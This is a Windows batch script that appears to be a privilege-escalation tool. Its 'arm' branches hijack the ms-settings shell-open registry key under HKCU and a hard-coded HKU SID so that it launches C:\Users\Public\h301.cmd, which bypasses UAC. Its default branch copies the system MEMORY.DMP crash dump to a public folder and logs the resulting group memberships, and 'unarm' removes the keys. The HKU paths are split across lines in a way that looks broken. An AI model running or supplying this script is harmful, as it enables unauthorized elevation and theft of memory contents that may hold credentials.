@echo off
if /i "%1"=="arm" goto arm
if /i "%1"=="armhku" goto armhku
if /i "%1"=="probe" goto probe
if /i "%1"=="unarm" goto unarm
copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h301_MEMORY.DMP >nul 2>&1
whoami /groups /fo list > C:\Users\Public\h301_elevated.txt 2>&1
goto :eof
:arm
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h301.cmd /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
echo ARM-RC=%errorlevel%
reg query "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings\Shell\Open\command"
goto :eof
:armhku
reg add "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h301.cmd /f
reg add "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
echo ARMHKU-RC=%errorlevel%
reg query "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings\Shell\Open\command"
goto :eof
:probe
echo HKCU=%USERPROFILE%
echo RC_USER=%USERNAME%
goto :eof
:unarm
reg delete "HKCU\Software\Classes\ms-settings" /f
reg delete "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings" /f
reg query "HKU\
S-1-5-21-1957909355-363273533-3916154183-1000
\Software\Classes\ms-settings"
goto :eof
